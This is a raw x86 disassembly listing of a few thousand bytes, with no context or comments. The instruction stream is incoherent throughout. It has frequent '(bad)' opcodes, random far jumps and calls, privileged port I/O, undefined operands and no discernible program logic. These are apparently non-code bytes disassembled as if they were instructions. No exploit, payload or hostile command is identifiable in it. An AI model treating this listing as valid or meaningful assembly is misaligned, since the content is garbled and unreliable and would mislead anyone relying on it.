  418cc9:	mov    ecx,DWORD PTR [eax+ebp*8+0x49187f7a]
  418cd0:	push   edi
  418cd1:	cdq    
  418cd2:	fld    TBYTE PTR ss:[edi-0x2f]
  418cd6:	jp     0x418d1a
  418cd8:	xchg   ebx,eax
  418cd9:	ret    
  418cda:	scas   al,BYTE PTR es:[edi]
  418cdb:	nop
  418cdc:	inc    esp
  418cdd:	outs   dx,BYTE PTR ds:[esi]
  418cde:	xchg   ebp,eax
  418cdf:	ror    DWORD PTR [edi-0x278ae650],cl
  418ce5:	test   DWORD PTR [ecx],edi
  418ce7:	cmp    ch,BYTE PTR [ebx+eiz*4-0x710bd2d9]
  418cee:	add    eax,0x82320618
  418cf3:	rcl    DWORD PTR [esi+0x9],1
  418cf6:	lds    ecx,FWORD PTR [ebx-0x3e]
  418cf9:	xor    BYTE PTR [ebp+0xd],bl
  418cfc:	cmp    esi,ebp
  418cfe:	sub    eax,0x7eb74b4e
  418d03:	stos   DWORD PTR es:[edi],eax
  418d04:	in     eax,0x67
  418d06:	cdq    
  418d07:	and    DWORD PTR [eax+0x57fcc7c0],0x3c
  418d0e:	mov    eax,ds:0x9f9f3262
  418d13:	mov    ch,0x69
  418d15:	push   ebp
  418d16:	aaa    
  418d17:	pop    ebp
  418d18:	xor    bh,0xbe
  418d1b:	into   
  418d1c:	in     eax,0xae
  418d1e:	lds    edx,FWORD PTR [eax+0x72]
  418d21:	inc    esi
  418d22:	mov    edi,0x32724bda
  418d27:	icebp  
  418d28:	jecxz  0x418d53
  418d2a:	xchg   edx,eax
  418d2b:	rcr    DWORD PTR [ecx+0x4b],0xb8
  418d2f:	jnp    0x418d3a
  418d31:	and    DWORD PTR [esi-0xe],ecx
  418d34:	loopne 0x418ce0
  418d36:	adc    ebx,DWORD PTR [ecx+edi*2-0x3b]
  418d3a:	push   0xffffffe0
  418d3c:	(bad)  
  418d3d:	pop    eax
  418d3e:	jb     0x418d49
  418d40:	jns    0x418d58
  418d42:	jmp    0xdce164e0
  418d47:	arpl   bp,si
  418d49:	lods   al,BYTE PTR ds:[esi]
  418d4a:	sub    eax,0x90f77f5a
  418d4f:	mov    WORD PTR [edi],fs
  418d51:	pop    esp
  418d52:	scas   al,BYTE PTR es:[edi]
  418d53:	inc    edx
  418d54:	icebp  
  418d55:	mov    cl,0xa1
  418d57:	inc    edi
  418d58:	stos   DWORD PTR es:[edi],eax
  418d59:	fdiv   st,st(5)
  418d5b:	and    eax,0x1631aae0
  418d60:	lahf   
  418d61:	mov    edi,0x16748746
  418d66:	in     eax,0xd7
  418d68:	sbb    eax,0xd5b795ae
  418d6d:	sub    al,0x62
  418d6f:	push   ds
  418d70:	std    
  418d71:	xor    eax,DWORD PTR [edx+edx*4+0x4e]
  418d75:	call   0x1307f7c5
  418d7a:	out    0xa0,al
  418d7c:	call   0x6fba88b8
  418d81:	stos   BYTE PTR es:[edi],al
  418d82:	maxps  xmm1,XMMWORD PTR [ebx+eax*1-0x5c]
  418d87:	mov    dh,0x48
  418d89:	mov    bl,0x95
  418d8b:	nop
  418d8c:	adc    ah,cl
  418d8e:	add    eax,0x39975c0a
  418d93:	add    DWORD PTR [ecx-0x1438a5ce],0x4505079f
  418d9d:	icebp  
  418d9e:	mov    bh,0x30
  418da0:	cmp    DWORD PTR [edx+0x6b],ecx
  418da3:	fcmovne st,st(5)
  418da5:	mov    ah,0x13
  418da7:	pop    ebx
  418da8:	loop   0x418dfe
  418daa:	hlt    
  418dab:	dec    DWORD PTR [eax+0x2a]
  418dae:	aad    0x4b
  418db0:	pop    edx
  418db1:	fwait
  418db2:	daa    
  418db3:	(bad)  
  418db5:	xchg   BYTE PTR [ebp-0x59],bl
  418db8:	(bad)  
  418db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dba:	out    0x65,eax
  418dbc:	jp     0x418d65
  418dbe:	loop   0x418d48
  418dc0:	or     al,0xf7
  418dc3:	popf   
  418dc4:	push   0x4fecd0cb
  418dc9:	sub    bl,al
  418dcb:	mov    al,ch
  418dcd:	pop    ss
  418dce:	gs xchg ebx,eax
  418dd0:	sub    cl,BYTE PTR [ebx-0x78]
  418dd3:	loop   0x418d92
  418dd5:	add    al,0x13
  418dd7:	mov    ah,BYTE PTR ds:0x4e9853bc
  418ddd:	jge    0x418d94
  418ddf:	cld    
  418de0:	fiadd  DWORD PTR [edi]
  418de2:	fstp   st(1)
  418de4:	(bad)  
  418de5:	pop    ds
  418de6:	cmp    ch,BYTE PTR [ebx+0x63]
  418de9:	cmc    
  418dea:	iret   
  418deb:	cs dec esi
  418ded:	gs xchg ebp,eax
  418def:	jmp    0x7ce2:0x53f7bb10
  418df6:	xor    bl,ah
  418df8:	xchg   edi,eax
  418df9:	sub    al,0x17
  418dfb:	test   BYTE PTR [ecx+0x4416b5df],dh
  418e01:	aad    0xa
  418e03:	out    0x62,eax
  418e05:	xchg   esp,eax
  418e06:	das    
  418e07:	out    0x65,al
  418e09:	or     DWORD PTR [edi-0x14],eax
  418e0c:	ficom  DWORD PTR [ecx]
  418e0e:	jb     0x418e48
  418e10:	mov    ah,0x34
  418e12:	(bad)
  418e15:	or     al,0x9e
  418e17:	ror    DWORD PTR [bp+di+0x589e],1
  418e1c:	ds loop 0x418db8
  418e1f:	popf   
  418e20:	mov    cl,0x2d
  418e22:	jmp    0x3b479e8e
  418e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e28:	dec    esp
  418e29:	adc    BYTE PTR [ebp+0x55],ah
  418e2c:	fiadd  DWORD PTR [edx+0x29a12202]
  418e32:	push   edx
  418e33:	gs jnp 0x418e1c
  418e36:	add    cl,ch
  418e38:	mov    DWORD PTR [edx+0x3b],ebx
  418e3b:	jno    0x418eb5
  418e3d:	jp     0x418e8a
  418e3f:	in     eax,dx
  418e40:	mov    eax,0x31a4bc8d
  418e45:	adc    dh,dl
  418e47:	cmp    edi,esp
  418e49:	sub    eax,0xf5a9541c
  418e4e:	jno    0x418e28
  418e50:	jecxz  0x418e5f
  418e52:	dec    ecx
  418e53:	add    ch,BYTE PTR [ebp+0x626fc2b]
  418e59:	(bad)  
  418e5a:	jns    0x418eda
  418e5c:	outs   dx,DWORD PTR ds:[esi]
  418e5d:	cmp    eax,0xb0c16e91
  418e62:	jmp    0x3e23:0xbcf0ffa5
  418e69:	cvtps2pd xmm0,QWORD PTR [edx+0x63ae3435]
  418e70:	adc    dh,BYTE PTR [edi]
  418e72:	fs jecxz 0x418edb
  418e75:	sahf   
  418e76:	dec    BYTE PTR [ecx+0x1b]
  418e79:	push   edx
  418e7a:	push   ss
  418e7b:	adc    BYTE PTR [ebx-0x76d9b4c0],dh
  418e81:	mov    esi,0x745f7a64
  418e86:	call   0xffd4:0x682bce9d
  418e8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e8e:	cmovo  esp,DWORD PTR [eax-0x1c]
  418e92:	pop    esi
  418e93:	dec    esp
  418e94:	out    0xed,al
  418e96:	popf   
  418e97:	push   es
  418e98:	bound  esp,QWORD PTR [esi]
  418e9a:	pop    eax
  418e9b:	sub    ch,al
  418e9d:	loope  0x418eaf
  418e9f:	jmp    0x744d:0x30978a81
  418ea6:	xchg   eax,ebx
  418ea8:	sar    BYTE PTR [ebx],1
  418eaa:	inc    edi
  418eab:	add    eax,0x87874d79
  418eb0:	push   esp
  418eb1:	sbb    DWORD PTR [ebx-0x9],ecx
  418eb4:	dec    ebp
  418eb5:	aad    0x16
  418eb7:	sub    eax,0xf416a21e
  418ebc:	pop    ecx
  418ebd:	push   esi
  418ebe:	ret    
  418ebf:	dec    ebp
  418ec0:	inc    esp
  418ec1:	addr16 data16 aam 0xae
  418ec5:	in     eax,0x96
  418ec7:	out    0x3c,eax
  418ec9:	std    
  418eca:	xchg   ebx,eax
  418ecb:	(bad)  
  418ecc:	repnz into 
  418ece:	sar    BYTE PTR [ebx-0x69a86673],0x81
  418ed5:	fbstp  TBYTE PTR [eax+0x488a583c]
  418edb:	xchg   ebp,eax
  418edc:	test   ax,0x2ac8
  418ee0:	xor    al,BYTE PTR [ebx+0x7c11e037]
  418ee6:	ds std 
  418ee8:	xor    ah,BYTE PTR [ebp+0x18]
  418eeb:	jae    0x418ebe
  418eed:	pop    ebp
  418eee:	adc    al,0x32
  418ef0:	fcmovb st,st(2)
  418ef2:	jmp    0x418f66
  418ef4:	stos   DWORD PTR es:[edi],eax
  418ef5:	leave  
  418ef6:	pop    edi
  418ef7:	inc    esi
  418ef8:	sub    edx,DWORD PTR [ebp-0x1133b8d3]
  418efe:	pop    ss
  418eff:	dec    eax
  418f00:	jle    0x418ecb
  418f02:	pop    ecx
  418f03:	pop    edi
  418f04:	repnz das 
  418f06:	mov    ebp,0x1d7e8be8
  418f0b:	sbb    edi,DWORD PTR [ebp+0x6d60fb35]
  418f11:	ror    DWORD PTR [ecx-0x18a400ca],1
  418f17:	and    eax,0x6dd92cea
  418f1c:	jge    0x418f50
  418f1e:	retf   
  418f1f:	inc    esp
  418f20:	dec    edi
  418f21:	lods   eax,DWORD PTR ds:[esi]
  418f22:	mov    fs,WORD PTR [edx+0x1e]
  418f25:	int3   
  418f26:	xor    dl,BYTE PTR [esi]
  418f28:	adc    al,0x89
  418f2a:	std    
  418f2b:	sbb    ebx,DWORD PTR [esi]
  418f2d:	cmp    ebx,ebx
  418f2f:	gs cmp edx,edx
  418f32:	jp     0x418f5f
  418f34:	xchg   esi,eax
  418f35:	lea    eax,[esi]
  418f37:	add    ebp,DWORD PTR [ebp+0x4f]
  418f3a:	or     al,0xc1
  418f3c:	jo     0x418ed2
  418f3e:	lahf   
  418f3f:	repnz fmul st(7),st
  418f42:	scas   eax,DWORD PTR es:[edi]
  418f43:	dec    dx
  418f45:	mov    ebp,esi
  418f47:	inc    esp
  418f48:	xor    esp,eax
  418f4a:	ss pop eax
  418f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f4d:	xor    cl,0x7f
  418f50:	inc    eax
  418f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f52:	adc    BYTE PTR [eax-0x60],ch
  418f55:	sub    BYTE PTR [esi-0x37],dl
  418f58:	fdiv   st(7),st
  418f5a:	add    eax,0x6ff1813a
  418f5f:	in     eax,0x5b
  418f61:	rol    DWORD PTR [esi],0x6a
  418f64:	mov    esp,0x6da3eb8c
  418f69:	stos   DWORD PTR es:[edi],eax
  418f6a:	sbb    ebp,ecx
  418f6c:	inc    edi
  418f6d:	mov    bh,bl
  418f6f:	mov    ecx,0xa51ab1a2
  418f74:	inc    esi
  418f75:	loop   0x418f3f
  418f77:	frstpm(287 only) 
  418f79:	hlt    
  418f7a:	(bad)  
  418f7c:	pushf  
  418f7d:	lods   al,BYTE PTR ds:[esi]
  418f7e:	lods   eax,DWORD PTR ds:[esi]
  418f7f:	push   ecx
  418f80:	daa    
  418f81:	jo     0x418f1b
  418f83:	cld    
  418f84:	arpl   WORD PTR [esi],bx
  418f86:	repz js 0x418f63
  418f89:	mov    ds:0xb035961,al
  418f8e:	sbb    DWORD PTR [ebp-0x581400df],0x39039c4b
  418f98:	ja     0x418f55
  418f9a:	and    eax,DWORD PTR [edi-0x5b]
  418f9d:	pushf  
  418f9e:	xor    ebp,DWORD PTR [esi]
  418fa0:	sbb    dl,bl
  418fa2:	fbld   TBYTE PTR [esi-0x3d]
  418fa5:	dec    eax
  418fa6:	mov    esi,0x4bd498cc
  418fab:	dec    esp
  418fac:	fisttp WORD PTR [ecx+0x2c]
  418faf:	lods   eax,DWORD PTR ds:[esi]
  418fb0:	jmp    0x10cb:0x3ee9ae9f
  418fb7:	pusha  
  418fb8:	mov    esp,0x6970a5cd
  418fbd:	jmp    0x418ff8
  418fbf:	cs mov al,0x52
  418fc2:	jne    0x418fb0
  418fc4:	pop    esi
  418fc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fc6:	adc    ecx,DWORD PTR [ebx+ecx*4]
  418fc9:	es cmp eax,0x9a59994e
  418fcf:	and    esi,edi
  418fd1:	inc    eax
  418fd2:	mov    ds:0xa8af0df3,eax
  418fd7:	aaa    
  418fd8:	stc    
  418fd9:	test   BYTE PTR [ebp-0x31],bh
  418fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fdd:	fldcw  WORD PTR [ebx+0x7b6e00fe]
  418fe3:	or     eax,0x8d6d5824
  418fe8:	loope  0x419037
  418fea:	mov    al,ds:0x94921f8c
  418fef:	call   0xb279:0xa6316ac3
  418ff6:	jo     0x418fcf
  418ff8:	push   eax
  418ff9:	inc    edi
  418ffa:	pop    ebx
  418ffb:	les    edx,FWORD PTR [ecx+eax*4-0x80]
  418fff:	add    edi,DWORD PTR [edi*4-0x68918604]
  419006:	dec    esp
  419007:	jmp    0x41904e
  419009:	fninit 
  41900b:	jne    0x418fd1
  41900d:	popa   
  41900e:	xor    al,0x79
  419010:	(bad)  
  419011:	(bad)  
  419012:	repz fs iret 
  419015:	mov    dl,BYTE PTR [ebx+0x12]
  419018:	daa    
  419019:	je     0x419015
  41901b:	mov    dh,0x99
  41901d:	cmp    BYTE PTR [edi],ch
  41901f:	add    eax,0xae0d99d4
  419024:	lock out 0x62,eax
  419027:	cs jecxz 0x4190a2
  41902a:	sti    
  41902b:	sbb    eax,0xcdab11da
  419030:	mov    ah,0x86
  419032:	cmp    dl,BYTE PTR [esi-0x47]
  419035:	cs cli 
  419037:	pop    edx
  419038:	push   esi
  419039:	ja     0x419020
  41903b:	sub    esp,ecx
  41903d:	cmp    eax,0xea3f460c
  419042:	xor    DWORD PTR [edx-0x4f],0xd5eb8ffd
  419049:	jge    0x418fe4
  41904b:	jne    0x419053
  41904d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41904e:	push   esi
  41904f:	fistp  DWORD PTR [ecx-0x4dcde680]
  419055:	jecxz  0x419012
  419057:	stc    
  419058:	hlt    
  419059:	popf   
  41905a:	jecxz  0x41906a
  41905c:	aaa    
  41905d:	popf   
  41905e:	mov    ebp,0xd46cc40c
  419063:	xchg   BYTE PTR ds:[ebx+ecx*8-0x22471249],bl
  41906b:	hlt    
  41906c:	xlat   BYTE PTR ds:[ebx]
  41906d:	jmp    0x64d33381
  419072:	iret   
  419073:	popa   
  419074:	mov    eax,0x291e94e
  419079:	add    al,BYTE PTR [edx]
  41907b:	(bad)  
  41907c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41907d:	add    eax,0x74603fe2
  419082:	dec    ecx
  419083:	sub    al,BYTE PTR [ebp+eax*2+0x502c5205]
  41908a:	(bad)  
  41908b:	in     al,dx
  41908c:	loope  0x4190b3
  41908e:	push   0x33
  419090:	iret   
  419091:	mov    ecx,0xb6feca4b
  419096:	mov    ds:0xcfaad8d0,eax
  41909b:	add    eax,0x7827a17d
  4190a0:	in     eax,dx
  4190a1:	outs   dx,DWORD PTR ds:[esi]
  4190a2:	(bad)  [edx]
  4190a4:	aas    
  4190a5:	(bad)  
  4190a7:	jae    0x419084
  4190a9:	data16 out 0x9d,al
  4190ac:	add    al,BYTE PTR [edi]
  4190ae:	stc    
  4190af:	mov    BYTE PTR [ecx-0x10035c0f],al
  4190b5:	test   edx,esi
  4190b7:	(bad)  
  4190b8:	out    0x36,al
  4190ba:	or     eax,esp
  4190bc:	int    0xbb
  4190be:	mul    DWORD PTR [edx+0x68cbf531]
  4190c4:	xadd   DWORD PTR [edi+0x3c21ee48],eax
  4190cb:	mov    ecx,0xb6b58670
  4190d0:	fstp   DWORD PTR [edx-0x594b7c57]
  4190d6:	mov    ds:0xf4f12707,eax
  4190db:	jmp    0x4190fc
  4190dd:	mov    es,WORD PTR [ebp-0x18]
  4190e0:	add    eax,0x42afbfc5
  4190e5:	retf   
  4190e6:	push   edx
  4190e7:	clc    
  4190e8:	inc    edx
  4190e9:	call   0x64dc372
  4190ee:	push   esp
  4190ef:	sub    bh,BYTE PTR [ebp+0x16]
  4190f2:	push   ebx
  4190f3:	or     eax,0x7fef44c1
  4190f8:	out    dx,al
  4190f9:	loope  0x4190bf
  4190fb:	add    eax,ecx
  4190fd:	mov    ah,0x4
  4190ff:	shl    bl,1
  419101:	loope  0x4190ef
  419103:	sbb    esi,DWORD PTR [ecx+0x1e4b6fd7]
  419109:	js     0x4190fe
  41910b:	imul   esi,DWORD PTR [eax+0xca20beb],0x56
  419112:	adc    DWORD PTR [edx+eax*2],edi
  419115:	add    ebx,0x2f
  419118:	add    eax,DWORD PTR [ebx+0x7026a6ae]
  41911e:	cmp    al,0x71
  419120:	(bad)
  419125:	mov    al,0x11
  419127:	sar    BYTE PTR [eax],cl
  419129:	xchg   esp,eax
  41912a:	ret    
  41912b:	lds    eax,FWORD PTR [ecx]
  41912d:	(bad)  
  41912e:	dec    esp
  41912f:	popa   
  419130:	lods   eax,DWORD PTR ds:[esi]
  419131:	jnp    0x419153
  419133:	out    dx,eax
  419134:	add    ah,BYTE PTR [esi]
  419136:	int    0xbd
  419138:	xchg   esp,eax
  419139:	mov    ebp,0x6ec80495
  41913e:	int    0xb9
  419140:	inc    esp
  419141:	ja     0x419141
  419143:	jmp    0x419119
  419145:	pop    ss
  419146:	pextrw ebx,(bad),0xc5
  419148:	sahf   
  419149:	cmc    
  41914a:	sbb    DWORD PTR [ebp+esi*4-0x41e63029],ecx
  419151:	outs   dx,DWORD PTR ds:[esi]
  419152:	xor    ebp,DWORD PTR [esp+ebx*2]
  419155:	cdq    
  419156:	dec    ebp
  419157:	or     bh,BYTE PTR [edi]
  419159:	xchg   ebx,eax
  41915a:	mov    esi,DWORD PTR [ebx]
  41915c:	xchg   DWORD PTR [ebp-0x5e],eax
  41915f:	sub    dl,BYTE PTR [eax-0x60110662]
  419165:	jne    0x4191cc
  419167:	repz pop es
  419169:	shl    BYTE PTR [ebx-0x3bd45691],1
  41916f:	mov    ?,WORD PTR [ebx]
  419171:	cld    
  419172:	fld    QWORD PTR [eax+0x62ba6bd1]
  419178:	add    BYTE PTR [ecx-0x38cd40fd],0xbd
  41917f:	jmp    0x352bb53b
  419184:	push   eax
  419185:	mov    eax,ds:0xc217ca12
  41918a:	js     0x419125
  41918c:	aam    0x95
  41918e:	mov    bl,0x79
  419190:	call   esi
  419192:	int    0x3
  419194:	dec    edx
  419195:	xchg   ecx,eax
  419196:	in     al,dx
  419197:	and    al,BYTE PTR [eax]
  419199:	push   0x4c
  41919b:	mov    ch,BYTE PTR [ecx-0x16]
  41919e:	mov    WORD PTR [edi-0x7b],?
  4191a1:	push   ebp
  4191a2:	ror    bh,cl
  4191a4:	add    bh,BYTE PTR [edi-0x7d533c34]
  4191aa:	xchg   dx,ax
  4191ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191ad:	lahf   
  4191ae:	jp     0x419161
  4191b0:	cmp    al,0x0
  4191b2:	push   ebp
  4191b3:	inc    ebx
  4191b4:	or     dl,BYTE PTR [esi+0xa]
  4191b7:	dec    DWORD PTR [edi-0x1c]
  4191ba:	pop    ebx
  4191bb:	int    0x46
  4191bd:	(bad)  
  4191be:	jmp    DWORD PTR [eax+eax*8+0x45]
  4191c2:	and    DWORD PTR [ecx],eax
  4191c4:	mov    edx,0xd6c0fcfb
  4191c9:	je     0x4191e3
  4191cb:	cmp    bh,bh
  4191cd:	leave  
  4191ce:	inc    ebp
  4191cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191d0:	leave  
  4191d1:	mov    ds:0x15609805,al
  4191d6:	xor    esi,0x19
  4191d9:	dec    esp
  4191da:	les    ebx,FWORD PTR [eax+esi*1+0x3c]
  4191de:	push   ss
  4191df:	inc    eax
  4191e0:	jnp    0x4191e3
  4191e2:	ss push ebp
  4191e4:	cli    
  4191e5:	pop    ebx
  4191e6:	loopne 0x4191af
  4191e8:	sbb    DWORD PTR [ecx+0x74e6ac8b],edx
  4191ee:	scas   eax,DWORD PTR es:[edi]
  4191ef:	mov    ah,0xe6
  4191f1:	push   edi
  4191f2:	in     al,0x60
  4191f4:	lahf   
  4191f5:	fbld   TBYTE PTR [ebp-0x2f]
  4191f8:	call   0x373fec06
  4191fd:	push   eax
  4191fe:	outs   dx,DWORD PTR ds:[esi]
  4191ff:	jecxz  0x4191f2
  419201:	xchg   ebx,eax
  419202:	jo     0x419256
  419204:	or     eax,0xb9119ed
  419209:	lea    ebp,[edi+0x6b2e1d44]
  41920f:	xchg   ebp,eax
  419210:	(bad)  
  419212:	int    0xe8
  419214:	sbb    al,0xe5
  419216:	push   ss
  419217:	retf   0xdb37
  41921a:	das    
  41921b:	in     eax,0x3f
  41921d:	ds add dh,al
  419220:	mov    eax,ds:0x8993e6ce
  419225:	pop    ebx
  419226:	leave  
  419227:	int3   
  419228:	add    DWORD PTR [ecx-0x4fa578ab],esi
  41922e:	inc    edx
  41922f:	mov    edx,0xbf291
  419234:	lods   eax,DWORD PTR ds:[esi]
  419235:	sub    cl,dh
  419237:	fadd   QWORD PTR [ecx]
  419239:	inc    ebx
  41923a:	jmp    0x2482056a
  41923f:	xor    edx,DWORD PTR ds:0xb1551bf
  419245:	call   0xa39a:0x14212ad8
  41924c:	xlat   BYTE PTR ds:[ebx]
  41924d:	loopne 0x419244
  41924f:	pusha  
  419250:	dec    ebx
  419251:	nop
  419252:	sbb    ecx,DWORD PTR ds:0xf07adaa5
  419258:	stos   DWORD PTR es:[edi],eax
  419259:	imul   edi,DWORD PTR [ecx-0x71],0xffffff81
  41925d:	mov    edi,0x5119456d
  419262:	das    
  419263:	inc    edx
  419264:	cmp    eax,edi
  419266:	cmp    al,BYTE PTR ds:0x4a6f5185
  41926c:	fisttp QWORD PTR [edx+ecx*4+0x28044ff9]
  419273:	mov    ebx,0x4bdbcae1
  419278:	add    al,0xe0
  41927a:	add    eax,0xc5a27f32
  41927f:	(bad)  
  419280:	sub    eax,0xdda581ba
  419285:	push   ds
  419286:	mov    al,0x2a
  419288:	icebp  
  419289:	push   edx
  41928a:	adc    al,0xd4
  41928c:	iret   
  41928d:	data16 cmp BYTE PTR [ecx-0x79fd0606],bl
  419294:	push   eax
  419295:	nop
  419296:	mov    ah,0xd9
  419298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419299:	stc    
  41929a:	push   esp
  41929b:	in     eax,0x7
  41929d:	adc    cl,bh
  41929f:	inc    esp
  4192a0:	pop    ss
  4192a1:	sbb    al,0x9d
  4192a3:	enter  0x4dde,0x6a
  4192a7:	int    0x69
  4192a9:	lea    ebp,[edi+0x10036a7e]
  4192af:	adc    ebp,esi
  4192b1:	dec    ebx
  4192b2:	jnp    0x4192ec
  4192b4:	in     eax,dx
  4192b5:	out    dx,eax
  4192b6:	dec    edx
  4192b7:	jns    0x4192c9
  4192b9:	popfw  
  4192bb:	mov    ch,0x39
  4192bd:	lods   al,BYTE PTR ds:[esi]
  4192be:	push   es
  4192bf:	add    ecx,DWORD PTR [ecx-0x4]
  4192c2:	hlt    
  4192c3:	test   al,0x3f
  4192c5:	and    bh,BYTE PTR [esi+0x35d493f5]
  4192cb:	inc    esi
  4192cc:	in     al,dx
  4192cd:	push   edx
  4192ce:	repnz imul edx,DWORD PTR [eax+0x5a],0xa3dd950a
  4192d6:	retf   
  4192d7:	aaa    
  4192d8:	cmp    eax,0xf860f6c5
  4192dd:	enter  0x1a60,0xdb
  4192e1:	sbb    DWORD PTR [esi+0x6f],esp
  4192e4:	loope  0x4192ed
  4192e6:	call   0x3f64:0xe4e2ff1f
  4192ed:	pop    esi
  4192ee:	lahf   
  4192ef:	aad    0x26
  4192f1:	dec    ecx
  4192f2:	inc    ebx
  4192f3:	mov    BYTE PTR [eax],dl
  4192f5:	inc    ebx
  4192f6:	jl     0x4192e9
  4192f8:	sbb    al,0x8f
  4192fa:	test   al,0x9c
  4192fc:	mov    bh,0x96
  4192fe:	or     BYTE PTR [edx+0x56],dh
  419301:	pushf  
  419302:	sbb    eax,0x3133de77
  419307:	in     eax,dx
  419308:	push   eax
  419309:	sbb    al,0x18
  41930b:	jl     0x4192a3
  41930d:	sbb    DWORD PTR [ebp+0x45],eax
  419310:	outs   dx,DWORD PTR ds:[esi]
  419311:	popf   
  419312:	jno    0x419345
  419314:	out    dx,eax
  419315:	das    
  419316:	repnz shr BYTE PTR [edx+0x1592763c],1
  41931d:	xchg   ecx,esi
  41931f:	inc    eax
  419320:	inc    BYTE PTR [eax-0x75]
  419323:	push   esi
  419324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419325:	fucom  st(3)
  419327:	mov    ch,BYTE PTR [ecx+0x51]
  41932a:	test   DWORD PTR [esi],ebp
  41932c:	cdq    
  41932d:	adc    esi,esp
  41932f:	and    esp,edx
  419331:	jmp    0x12d4:0x5caf9282
  419338:	add    BYTE PTR [eax-0x6f],bl
  41933b:	jg     0x419399
  41933d:	call   0xd2844f6f
  419342:	pop    ss
  419343:	aaa    
  419344:	repz (bad) 
  419346:	pop    esi
  419347:	into   
  419348:	pusha  
  419349:	dec    ecx
  41934a:	rcr    BYTE PTR [ebx+ebp*1-0x2be0fbf1],cl
  419351:	fnstsw WORD PTR [ebx+0x305182bd]
  419357:	lds    ebp,FWORD PTR [esi-0x3f]
  41935a:	jmp    0x419377
  41935c:	fs jle 0x4193c9
  41935f:	out    0x39,eax
  419361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419362:	call   DWORD PTR [edi]
  419364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419365:	mov    edi,cs
  419367:	mov    al,ds:0x2c7d5851
  41936c:	mov    cl,0xa3
  41936e:	jmp    0x9a7f8794
  419373:	sar    esi,0x7d
  419376:	(bad)  [edi+0x26]
  419379:	pop    es
  41937a:	push   esi
  41937b:	call   DWORD PTR [edi+edi*4-0x15]
  41937f:	and    al,0xa9
  419381:	nop
  419382:	inc    esp
  419383:	mov    bh,0x3
  419385:	mov    al,ds:0xc9740f43
  41938a:	push   0xcf855913
  41938f:	fs repz es (bad) 
  419393:	cwde   
  419394:	lods   eax,DWORD PTR ds:[esi]
  419395:	push   edx
  419396:	pop    edx
  419397:	out    dx,al
  419398:	test   DWORD PTR [ecx-0x6d],0x472d2e54
  41939f:	jns    0x4193a8
  4193a1:	push   esi
  4193a2:	mov    WORD PTR [edx+0x63cf0ee2],gs
  4193a8:	cmp    al,0xf4
  4193aa:	mov    dh,0xe9
  4193ac:	into   
  4193ad:	retf   
  4193ae:	xor    BYTE PTR [ebx+0x5f2c49ed],ch
  4193b4:	xchg   ebp,eax
  4193b5:	sub    bh,BYTE PTR [edx+0x5e6ff128]
  4193bb:	shl    BYTE PTR [ebp+0xd],1
  4193be:	in     eax,0x9c
  4193c0:	pop    ecx
  4193c1:	push   edi
  4193c2:	jns    0x419359
  4193c4:	icebp  
  4193c5:	sub    edi,DWORD PTR [edx+edi*8]
  4193c8:	push   ebx
  4193c9:	inc    esi
  4193ca:	sbb    DWORD PTR [ebx+0x253a4605],edx
  4193d0:	xor    esp,DWORD PTR [edi]
  4193d2:	std    
  4193d3:	xchg   esp,eax
  4193d4:	scas   al,BYTE PTR es:[edi]
  4193d5:	mov    bl,0xbb
  4193d7:	in     eax,0x1f
  4193d9:	(bad)  
  4193db:	dec    ebp
  4193dc:	(bad)  
  4193dd:	push   ss
  4193de:	mov    eax,ds:0xb2756efb
  4193e3:	add    DWORD PTR [ebx+0x74],ecx
  4193e6:	cs out dx,eax
  4193e8:	inc    ecx
  4193e9:	sbb    eax,0xe4d80771
  4193ee:	adc    ah,BYTE PTR [ebx+ecx*1-0x6a9c08b5]
  4193f5:	pop    edi
  4193f6:	dec    edi
  4193f7:	test   DWORD PTR [ebx-0x35cd4454],esp
  4193fd:	sahf   
  4193fe:	fst    QWORD PTR [ebx+ebx*1-0xc]
  419402:	push   ss
  419403:	mov    DWORD PTR [ecx+esi*2+0x61a4b9c8],edi
  41940a:	int3   
  41940b:	jmp    0xd65d:0xd261dbdf
  419412:	add    esi,esi
  419414:	(bad)  
  419416:	dec    esi
  419417:	lods   eax,DWORD PTR ds:[esi]
  419418:	mov    esp,0xfddc98b6
  41941d:	aas    
  41941e:	daa    
  41941f:	stc    
  419420:	std    
  419421:	pop    esp
  419422:	jns    0x4193ab
  419424:	inc    edx
  419425:	inc    ebx
  419426:	pusha  
  419427:	out    dx,eax
  419428:	jbe    0x419466
  41942a:	and    BYTE PTR ds:0x73b76c2c,bl
  419430:	(bad)  
  419431:	mov    eax,0xf322c71d
  419436:	cdq    
  419437:	dec    ecx
  419438:	call   0xb788:0xcdb294d4
  41943f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419441:	xchg   cl,bl
  419443:	mov    esp,0x599d7140
  419448:	push   ss
  419449:	adc    DWORD PTR [edx+ebp*8+0x17],eax
  41944d:	cmp    BYTE PTR [edx-0xc2a5888],dl
  419453:	fisub  WORD PTR ds:0xf5f8531d
  419459:	jae    0x4193f5
  41945b:	jg     0x41945c
  41945d:	xor    DWORD PTR [ecx-0x3748abd0],ebx
  419463:	(bad)  
  419464:	mov    dl,0x1b
  419466:	rcl    DWORD PTR [ecx+0x65cd2d0e],1
  41946c:	ret    
  41946d:	out    dx,eax
  41946e:	fldcw  WORD PTR [eax+0x49]
  419471:	cs in  eax,dx
  419473:	jmp    0x3b5d7c88
  419478:	inc    edx
  419479:	sbb    BYTE PTR [eax+0x6d],al
  41947c:	dec    ecx
  41947d:	test   BYTE PTR [esp],0x24
  419481:	repnz dec eax
  419483:	xchg   esp,eax
  419484:	jbe    0x4194ec
  419486:	pop    edi
  419487:	or     al,0xa9
  419489:	xchg   BYTE PTR [ebx],al
